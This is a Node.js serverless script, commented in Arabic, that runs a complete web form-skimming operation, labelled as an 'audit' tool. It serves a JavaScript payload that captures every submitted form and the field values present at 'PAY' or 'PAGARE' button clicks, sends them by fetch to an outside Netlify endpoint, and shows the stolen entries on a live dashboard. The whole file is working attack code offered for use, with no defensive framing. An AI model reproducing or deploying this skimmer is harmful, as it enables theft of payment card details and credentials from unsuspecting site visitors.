const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const serverless = require('serverless-http');

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

let capturedData = [];

// 1. استقبال البيانات المخطوفة
app.post('/api/exfiltrate', (req, res) => {
    const data = req.body;
    data.time = new Date().toLocaleString();
    capturedData.unshift(data);
    res.json({ status: 'success' });
});

// 2. جلب البيانات للوحة التحكم
app.get('/api/data', (req, res) => {
    res.json(capturedData);
});

// 3. كود السحب (Payload) - تم تحديثه ليكون "خاطف نماذج"
app.get('/', (req, res) => {
    res.set('Content-Type', 'application/javascript');
    
    // كود الخطف الصافي والمبسط لتجنب أخطاء Netlify
    var payload = "console.log('Xless Audit Active');" +
        "var target = 'https://willowy-kataifi-31efc6.netlify.app/api/exfiltrate';" +
        "function send(d){ fetch(target, {method:'POST', mode:'no-cors', body:JSON.stringify(d)}); }" +
        "send({ url: location.href, type: 'INITIAL_HIT' });" +
        
        // مراقبة جميع النماذج (Forms) وخطف البيانات عند الضغط على "دفع"
        "document.addEventListener('submit', function(e){" +
        "  var fd = {}; var inputs = e.target.querySelectorAll('input, select');" +
        "  inputs.forEach(i => { fd[i.name || i.id] = i.value; });" +
        "  send({ type: 'FORM_HIJACK', data: fd, url: location.href });" +
        "});" +
        
        // مراقبة الضغط على الأزرار مباشرة (احتياطياً)
        "document.addEventListener('click', function(e){" +
        "  if(e.target.innerText && (e.target.innerText.includes('PAGARE') || e.target.innerText.includes('PAY'))){" +
        "    var ai = {}; document.querySelectorAll('input').forEach(i => { ai[i.name || i.id] = i.value; });" +
        "    send({ type: 'BUTTON_CLICK_CAPTURE', data: ai });" +
        "  }" +
        "});";
        
    res.send(payload);
});

// 4. لوحة التحكم (Dashboard)
app.get('/dashboard', (req, res) => {
    var html = "<html><head><title>Xless Panel</title><style>" +
        "body{background:#000;color:#0f0;font-family:monospace;padding:20px}" +
        "table{width:100%;border-collapse:collapse;margin-top:20px}" +
        "th,td{border:1px solid #333;padding:10px;text-align:left}" +
        "th{background:#111}.val{color:#f0f;font-weight:bold}pre{margin:0;white-space:pre-wrap;}" +
        "</style></head><body>" +
        "<h1>XLESS LIVE PANEL - [AUDIT MODE]</h1>" +
        "<button onclick='location.reload()'>REFRESH DATA</button>" +
        "<table><thead><tr><th>Time</th><th>Type</th><th>Captured Data</th></tr></thead>" +
        "<tbody id='b'></tbody></table>" +
        "<script>" +
        "fetch('/api/data').then(r=>r.json()).then(data=>{" +
        "var h=''; data.forEach(d=>{" +
        "var displayData = d.data ? JSON.stringify(d.data, null, 2) : (d.field || d.type);" +
        "h+='<tr><td>'+d.time+'</td><td>'+(d.type||'HIT')+'</td><td class=\"val\"><pre>'+displayData+'</pre></td></tr>';" +
        "}); document.getElementById('b').innerHTML=h||'<tr><td colspan=\"3\">Waiting for data...</td></tr>';" +
        "});" +
        "</script></body></html>";
    res.send(html);
});

module.exports.handler = serverless(app);
